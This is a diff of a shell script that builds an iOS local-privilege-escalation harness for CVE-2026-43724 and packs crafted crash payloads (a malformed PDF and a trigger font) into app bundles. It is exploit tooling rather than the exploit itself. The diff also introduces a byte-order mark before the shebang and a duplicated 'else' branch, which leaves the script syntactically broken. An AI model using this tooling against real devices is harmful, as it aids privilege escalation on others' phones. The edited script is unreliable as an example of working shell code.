@@ -1,4 +1,4 @@
-#!/bin/sh
+﻿#!/bin/sh
 # build-ios.sh - build the CVE-2026-43724 first-mapper harness for iOS (arm64).
 # Two binaries:
 #   LPE            -> the app's main executable (host_ios.c): spawns the child SUSPENDED|RESLIDE,
@@ -486,12 +486,9 @@ echo "[+] built dist5/VTDECHEVCPURE.ipa"
 APP16="dist5/Payload/CG86950.app"
 mkdir -p "$APP16"
 COMPILE_ERR=""
-if ! CGERR=$($CC -O2 -g -o "$APP16/CG86950" cg86950_pure.c \
-    -framework CoreGraphics -framework ImageIO -framework CoreFoundation 2>&1); then
-  echo "[!] CG86950 failed to compile. error: $CGERR"
-  printf '%s\n' "$CGERR" > "$APP16/COMPILE_ERR.txt"
-  rm -f "$APP16/CG86950"
-else
+$CC -O2 -g -o "$APP16/CG86950" cg86950_pure.c \
+    -framework CoreGraphics -framework ImageIO -framework CoreFoundation || CGERR=$?
+if [ -f "$APP16/CG86950" ]; then
   echo "[+] CG86950 compiled (pure C, no Foundation)"
   if [ -f dirtyslide/test_payloads/crash_shading_type5_v2.pdf ]; then
     cp dirtyslide/test_payloads/crash_shading_type5_v2.pdf "$APP16/payload_crash_type5_v2.pdf"
@@ -501,6 +498,8 @@ else
     cp dirtyslide/test_payloads/trigger.ttf "$APP16/payload_trigger.ttf" 2>/dev/null || true
     echo "[+] crafted payload files staged into CG86950.app bundle"
   fi
+else
+  echo "[!] CG86950 failed to compile (exit=$CGERR — the stderr shown above)"
 else
   echo "[!] CG86950 failed to compile - continuing without it"
   rm -f "$APP16/CG86950"
